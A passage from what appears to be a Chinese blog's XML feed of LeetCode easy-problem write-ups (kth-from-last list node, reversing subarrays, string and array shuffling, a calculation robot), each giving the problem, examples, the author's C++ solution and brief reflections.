<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">kthToLast</span><span class="params">(ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//结点指针容器</span></span><br><span class="line">        <span class="built_in">vector</span>&lt;ListNode*&gt; tmp;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            tmp.push_back(head);</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp[tmp.size()-k]-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，轻松加愉快🥱</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>通过翻转子数组使两个数组相等</title>
    <url>/2020/11/13/%E9%80%9A%E8%BF%87%E7%BF%BB%E8%BD%AC%E5%AD%90%E6%95%B0%E7%BB%84%E4%BD%BF%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9B%B8%E7%AD%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/make-two-arrays-equal-by-reversing-sub-arrays/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你两个长度相同的整数数组 <code>target</code> 和 <code>arr</code> 。</p>
<p>每一步中，你可以选择 <code>arr</code> 的任意 <strong>非空子数组</strong> 并将它翻转。你可以执行此过程任意次。</p>
<p>如果你能让 <code>arr</code> 变得与 <code>target</code> 相同，返回 True；否则，返回 False 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; [1,2,3,4], arr &#x3D; [2,4,1,3]</span><br><span class="line">输出：true</span><br><span class="line">解释：你可以按照如下步骤使 arr 变成 target：</span><br><span class="line">1- 翻转子数组 [2,4,1] ，arr 变成 [1,4,2,3]</span><br><span class="line">2- 翻转子数组 [4,2] ，arr 变成 [1,2,4,3]</span><br><span class="line">3- 翻转子数组 [4,3] ，arr 变成 [1,2,3,4]</span><br><span class="line">上述方法并不是唯一的，还存在多种将 arr 变成 target 的方法。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; [7], arr &#x3D; [7]</span><br><span class="line">输出：true</span><br><span class="line">解释：arr 不需要做任何翻转已经与 target 相等。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; [1,12], arr &#x3D; [12,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; [3,7,9], arr &#x3D; [3,7,11]</span><br><span class="line">输出：false</span><br><span class="line">解释：arr 没有数字 9 ，所以无论如何也无法变成 target 。</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：target &#x3D; [1,1,1,1,1], arr &#x3D; [1,1,1,1,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>target.length == arr.length</code></li>
<li><code>1 &lt;= target.length &lt;= 1000</code></li>
<li><code>1 &lt;= target[i] &lt;= 1000</code></li>
<li><code>1 &lt;= arr[i] &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>题目要求对整数数组arr进行子数组反转，如果最后可以使arr变得和target相同返回true，其实也就是数组arr中的任何两个元素都可以进行交换，所以只要target中的元素与arr中的一样（无序），就返回true，否则返回false。</p>
<p><strong>c++代码：</strong>(执行用时36ms，击败49.21%，内存消耗14M，击败64.22%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canBeEqual</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; target, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历查找target中的元素是否都在arr中存在</span></span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;target.size();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>((it=find(arr.begin(),arr.end(),target[i]))==arr.end())&#123;</span><br><span class="line">                <span class="comment">//target中的元素在arr中没有找到</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//找到了则从arr中删除掉这个元素</span></span><br><span class="line">                arr.erase(it);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，其实思路也挺清晰的。看了一些题解后，更明白地讲就是只需判断两个数组排序后是否相等即可，使用sort函数排序，3行代码就搞定。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>速算机器人</title>
    <url>/2020/11/10/%E9%80%9F%E7%AE%97%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/nGK0Fy/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>小扣在秋日市集发现了一款速算机器人。店家对机器人说出两个数字（记作 <code>x</code> 和 <code>y</code>），请小扣说出计算指令：</p>
<ul>
<li><code>&quot;A&quot;</code> 运算：使 <code>x = 2 * x + y</code>；</li>
<li><code>&quot;B&quot;</code> 运算：使 <code>y = 2 * y + x</code>。</li>
</ul>
<p>在本次游戏中，店家说出的数字为 <code>x = 1</code> 和 <code>y = 0</code>，小扣说出的计算指令记作仅由大写字母 <code>A</code>、<code>B</code> 组成的字符串 <code>s</code>，字符串中字符的顺序表示计算顺序，请返回最终 <code>x</code> 与 <code>y</code> 的和为多少。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;AB&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">经过一次 A 运算后，x &#x3D; 2, y &#x3D; 0。</span><br><span class="line">再经过一次 B 运算，x &#x3D; 2, y &#x3D; 2。</span><br><span class="line">最终 x 与 y 之和为 4。</span><br></pre></td></tr></table></figure>
<p><strong>提示</strong></p>
<ul>
<li><code>0 &lt;= s.length &lt;= 10</code></li>
<li><code>s</code> 由 <code>&#39;A&#39;</code> 和 <code>&#39;B&#39;</code> 组成</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据题目描述直接模拟，根据字符串的每个字符执行相应的运算。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.1M，击败14.72%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">calculate</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x=<span class="number">1</span>,y=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;A&#x27;</span>)&#123;</span><br><span class="line">                x=<span class="number">2</span>*x+y;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">                y=<span class="number">2</span>*y+x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，太简单了，下一道走起😑</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>重新排列字符串</title>
    <url>/2020/11/10/%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/shuffle-string/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个字符串 <code>s</code> 和一个 长度相同 的整数数组 <code>indices</code> 。</p>
<p>请你重新排列字符串 <code>s</code> ，其中第 <code>i</code> 个字符需要移动到 <code>indices[i]</code> 指示的位置。</p>
<p>返回重新排列后的字符串。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/10/%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2/q1.jpg" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;codeleet&quot;, indices &#x3D; [4,5,6,7,0,2,1,3]</span><br><span class="line">输出：&quot;leetcode&quot;</span><br><span class="line">解释：如图所示，&quot;codeleet&quot; 重新排列后变为 &quot;leetcode&quot; 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;abc&quot;, indices &#x3D; [0,1,2]</span><br><span class="line">输出：&quot;abc&quot;</span><br><span class="line">解释：重新排列后，每个字符都还留在原来的位置上。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aiohn&quot;, indices &#x3D; [3,1,4,2,0]</span><br><span class="line">输出：&quot;nihao&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aaiougrt&quot;, indices &#x3D; [4,0,2,6,7,3,1,5]</span><br><span class="line">输出：&quot;arigatou&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;art&quot;, indices &#x3D; [1,0,2]</span><br><span class="line">输出：&quot;rat&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><p><code>s.length == indices.length == n</code></p>
</li>
<li><p><code>1 &lt;= n &lt;= 100</code></p>
</li>
<li><p><code>s</code> 仅包含小写英文字母。</p>
</li>
<li><p><code>0 &lt;= indices[i] &lt; n</code></p>
</li>
<li><p><code>indices</code> 的所有的值都是唯一的（也就是说，<code>indices</code> 是整数 <code>0</code> 到 <code>n - 1</code> 形成的一组排列）。</p>
</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用map容器，map容器存储键值对，会根据各键值对的键的大小升序排序。用indices数组中的值作为键，对应的字符作为值存到map容器中，最后用map中的值组成字符串返回。</p>
<p><strong>c++代码：</strong>(执行用时36ms，击败5.57%，内存消耗16.8M，击败5.04%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">restoreString</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; indices)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">char</span>&gt; myMap;</span><br><span class="line">        <span class="comment">//初始化map容器，会按照键值从小到大排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();++i)&#123;</span><br><span class="line">            myMap[indices[i]]=s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;myMap.size();++i)&#123;</span><br><span class="line">            s[i]=myMap[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/shuffle-string/solution/zhong-xin-pai-lie-zi-fu-chuan-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：模拟</strong><br><strong>思路与算法</strong></p>
<p>创建一个新字符串 $\textit{result}$ 来存储答案。对于 $s$ 每个下标 $i$，将 $\textit{result}[\textit{indices}$[i]]处的字符设成 $s[i]$即可。</p>
<p><strong>代码</strong>：（执行8ms，击败98.89%，内存15.2M，击败15.39%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">restoreString</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; indices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="function"><span class="built_in">string</span> <span class="title">result</span><span class="params">(length, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            result[indices[i]] = s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$，其中 $N$为字符串 $s$ 的长度。我们只需对字符串 $s$ 执行一次线性扫描即可。</p>
</li>
<li><p>空间复杂度：$O(1)$或 $O(N)$。除开辟的存储答案的字符串外，我们只需要常数空间存放若干变量。如果使用的语言不允许对字符串进行修改，我们还需要 $O(N)$的空间临时存储答案。</p>
</li>
</ul>
<p><strong>方法二：原地修改</strong><br><strong>思路与算法</strong></p>
<p>本题也可以通过原地修改输入数据的方式来求解。</p>
<p>直观的想法是：对于下标 $i$，需要把字符 $s[i]$ 移动到 $\textit{indices}[i]$ 的位置上；然后，我们前进到位置 ，并将字符 $s[\textit{indices}[i]]$移动到 $\textit{indices}[\textit{indices}[i]]$的位置上。类似的过程以此类推，直到最终回到起点 $i$。此时，封闭路径 $i \to \textit{indices}[i] \to \textit{indices}[\textit{indices}[i]] \to … \to i$上的所有字符，都已经被设置成正确的值。</p>
<p>我们只要找到 $\textit{indices}[i]$中所有这样的封闭路径，并进行对应的移动操作，就能够得到最终的答案。</p>
<p>这样做有一个小小的问题：当在第二步试图把字符 $s[\textit{indices}[i]]$移动到 $\textit{indices}[\textit{indices}[i]]$ 的位置上时，会发现字符  已经在第一步被覆写了。因此，在每一步移动前，需要先额外记录目标位置处字符的原有值。</p>
<p>另一个隐含的问题是如何避免处理重复的封闭路径。为了解决此问题，我们每处理一个封闭路径，就将该路径上的 $\textit{indices}$数组的值设置成<strong>下标自身</strong>。这样，当某个封闭路径被处理完毕后，扫描到该路径的另一个下标时，就不会处理该封闭路径了。</p>
<p>由于许多语言中的字符串类型都是<strong>不可更改的</strong>，实现原地修改较为麻烦，因此下面只给出 <code>C++</code> 的参考代码。</p>
<p><strong>代码：</strong>（执行16ms，击败77.65%，内存15.3M，击败13.37%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">restoreString</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; indices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (indices[i] != i) &#123;</span><br><span class="line">                <span class="keyword">char</span> ch = s[i]; <span class="comment">// 当前需要被移动的字符</span></span><br><span class="line">                <span class="keyword">int</span> idx = indices[i]; <span class="comment">// 该字符需要被移动的目标位置</span></span><br><span class="line">                <span class="keyword">while</span> (idx != i) &#123;</span><br><span class="line">                    swap(s[idx], ch); <span class="comment">// 使用 swap 函数，在覆写 s[idx] 之前，先将其原始值赋给变量 ch</span></span><br><span class="line">                    swap(indices[idx], idx); <span class="comment">// 将封闭路径中的 indices 数组的值设置成下标自身</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 退出循环后，还要再覆写起点处的字符</span></span><br><span class="line">                s[i] = ch;</span><br><span class="line">                indices[i] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$，其中 $N$ 为字符串 $s$ 的长度。尽管代码看上去有两层循环，但因为不会处理相同的封闭路径，每个下标实际上只被处理了一次，故时间复杂度是线性的。</p>
</li>
<li><p>空间复杂度：$O(1)$。我们只需开辟常量大小的额外空间。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>这道题其实直接模拟是效率比较高的，其他的方法反而可能效率不是那么高，我还用到了map集合想着高端一点🤣，结果官方题解都没用map</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>重新排列数组</title>
    <url>/2020/11/07/%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/shuffle-the-array/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>nums</code> ，数组中有 <code>2n</code> 个元素，按 <code>[x1,x2,...,xn,y1,y2,...,yn]</code> 的格式排列。</p>
<p>请你将数组按 <code>[x1,y1,x2,y2,...,xn,yn]</code> 格式重新排列，返回重排后的数组。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [2,5,1,3,4,7], n &#x3D; 3</span><br><span class="line">输出：[2,3,5,4,1,7] </span><br><span class="line">解释：由于 x1&#x3D;2, x2&#x3D;5, x3&#x3D;1, y1&#x3D;3, y2&#x3D;4, y3&#x3D;7 ，所以答案为 [2,3,5,4,1,7]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,4,4,3,2,1], n &#x3D; 4</span><br><span class="line">输出：[1,4,2,3,3,2,4,1]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,2,2], n &#x3D; 2</span><br><span class="line">输出：[1,2,1,2]</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 500</code></li>
<li><code>nums.length == 2n</code></li>
<li><code>1 &lt;= nums[i] &lt;= 10^3</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组nums，将按1、1+n、2、2+n…这样的顺序取出元素添加到结果中返回</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败73.25%，内存消耗9.9M，击败10.07%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">shuffle</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            result.push_back(nums[i]);</span><br><span class="line">            result.push_back(nums[i+n]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>题目比较简单，没有官方题解，Let‘s go on😛</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>链表中倒数第k个节点</title>
    <url>/2020/11/10/%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。例如，一个链表有6个节点，从头节点开始，它们的值依次是1、2、3、4、5、6。这个链表的倒数第3个节点是值为4的节点。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 k &#x3D; 2.</span><br><span class="line"></span><br><span class="line">返回链表 4-&gt;5.</span><br></pre></td></tr></table></figure>
